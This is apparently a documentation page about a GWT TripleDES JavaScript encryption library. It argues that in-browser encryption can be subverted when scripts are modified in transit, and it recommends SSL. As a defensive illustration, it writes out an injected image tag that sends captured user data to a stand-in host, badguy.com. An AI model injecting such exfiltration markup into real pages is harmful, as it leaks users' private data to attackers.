This is based on an email exchange I had with Brill Pappin and concerns I raised in a [blog post](http://www.mooreds.com/wordpress/archives/000529).  The upshot is that GWT encryption can, like any javascript encryption, be subverted.  If you want real security on the web, use SSL.


---


This implementation of TripleDES (tdes) is compatible with native java tdes implementations.

That still doesn't prevent the javascript from being modified to capture a paintext copy before encryption however.  The bouncy castle library was originally designed to be deployed on mobile phones were SSL was impossible.

If you send the key and the data down together, it would be easy to compromise.  However usually with tdes the keys are not transmitted but are already known by both sides.  You could send them to the user via some other transmission mechanism.

You can get more and more complex by combining values and rotating keys etc. and/or requiring user input to generate a key (there is a key generator in the library).

However javascript is sent over an http socket and could be intercepted. So unless you have SSL that is a worry.

The easiest way for a GWT TDES implementation to be compromised is to simply modify the javascript code while in transmission to the user, so that the anything the user encrypts is "copied" before encryption--that would not really be hard to do--however because the browser doesn't allow the script to arbitrarily post to a different random host, you have a minor stumbling block for the hacker; they'd have to do something else to get the 'copy' to their server, like add an image call to the DOM (<img src='http://badguy.com/?userinfo=userinfo' />).

If you are running over HTTPS then things are a bit more secure, because the browser will detect a modified javascript file.

So, the only way to have any reasonable confidence is to have the http session run over SSL or to not send the encryption library over the wire where it could be modified (do not send key over the wire in any case).

Keep in mind that as with any encryption, you are depending on the user to have their own box secure enough not to let a hacker in.